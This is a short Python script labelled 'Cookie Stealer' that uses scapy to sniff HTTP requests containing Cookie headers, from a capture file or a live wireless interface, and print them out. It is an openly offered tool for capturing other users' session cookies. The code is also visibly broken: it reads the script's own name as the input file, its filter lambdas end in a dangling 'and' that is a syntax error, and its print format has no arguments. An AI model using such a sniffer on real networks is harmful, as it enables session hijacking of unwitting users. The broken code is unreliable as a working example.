#!/usr/bin/env python
# encoding: utf-8

from scapy.utils import *
from scapy.all import *
import sys
f = sys.argv[0]
# Cookie Stealer

#
# Sample Simple script using http.py
# See https://github.com/invernizzi/scapy-http
#

load_contrib("HTTP")

if f:
    sniff(
        offline=f,
        lfilter=lambda pkt: HTTPRequest in pkt and
        "Cookie" in pkt[HTTPRequest].fields and
        prn=lambda pkt: sys.stdout.write("[%d] %s %s\n%s\n\n")
    )
else:
    sniff(
        # iface=wlan0
        lfilter=lambda pkt: HTTPRequest in pkt and
        "Cookie" in pkt[HTTPRequest].fields and
        prn=lambda pkt: sys.stdout.write("[%d] %s %s\n%s\n\n")
    )
